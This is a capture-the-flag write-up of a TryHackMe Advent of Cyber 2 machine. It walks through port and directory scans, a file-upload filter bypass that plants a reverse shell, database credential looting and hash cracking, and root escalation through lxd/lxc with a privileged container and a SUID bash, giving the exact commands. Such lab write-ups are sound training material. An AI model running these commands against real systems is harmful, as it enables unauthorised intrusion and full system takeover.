---
description: AdventOfCyber2 room from TryHackMe! write up.
---

# AdventOfCyber2

## Task 29

### NMAP scan

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-24 12:16 EST
Nmap scan report for 10.10.110.96
Host is up (0.049s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
65000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Light Cycle

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.94 seconds
```


### Gobuster scan

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.110.96:65000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,phtml,php
[+] Timeout:        10s
===============================================================
2020/12/24 12:23:15 Starting gobuster
===============================================================
/index.php (Status: 200)
/uploads.php (Status: 200)
/assets (Status: 301)
/api (Status: 301)
/grid (Status: 301)
Progress: 18271 / 220561 (8.28%)
===============================================================
2020/12/24 12:31:18 Finished
===============================================================

```

### Getting access

- Using burp to block the filter.js file and using the extension `.png.php` allowed me to upload a reverse shell
- In the `/grid` directory all the uploaded files were stored so i got the shell easily

### Upgrade and stabilize shell

```
# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
# In the reverse shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z

# In our machine
$ stty raw -echo
$ fg

# In reverse shell
# Push Intro/CTRL-C
$ export TERM=xterm
```

### web.txt flag

`/var/www/web.txt` --> `THM{ENTER_THE_GRID}`


### Local DB credentials

- `/var/www/TheGrid/includes/dbauth.php` --> tron:IFightForTheUsers (*DB address:* `localhost`, *MSQL DB:* tron)

### Accessing the local DB

Use `mysql -u tron -p tron` and introduce the password IFightForTheUsers

```
mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
+----+----------+----------------------------------+
```

Using Crackstation: `flynn:@computer@`

Looks like the user used the same password in the machine so `su flynn` and use the found password to change to the new user

### user.txt flag

`/home/flynn/user.txt` --> `THM{IDENTITY_DISC_RECOGNISED}`

### Scaling privileges

`flynn` user is in the `lxd` so we can use `lxc`:

```
flynn@light-cycle:~$ lxc image list
To start your first container, try: lxc launch ubuntu:18.04

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```

We are lucky, we already have an Alpine image in the machine (Very convenient), lets get root access:

`lxc init Alpine pwned -c security.privileged=true`
`lxc config device add pwned system disk source=/ path=/mnt/root recursive=true`
`lxc start pwned`
`lxc exec pwned /bin/sh`

Nice we are in the container, we can access the victim file system in `/mnt/root` and get the flag:

`/root/root.txt` --> `THM{FLYNN_LIVES}`

If you want to get access as root to the actual machine and not only the container we can do the following:

`chmod +s /mnt/root/bin/bash`

That command will set the SUID to the victim machine bash. Just exit the container and type `bash -p` to get access as root to the machine!
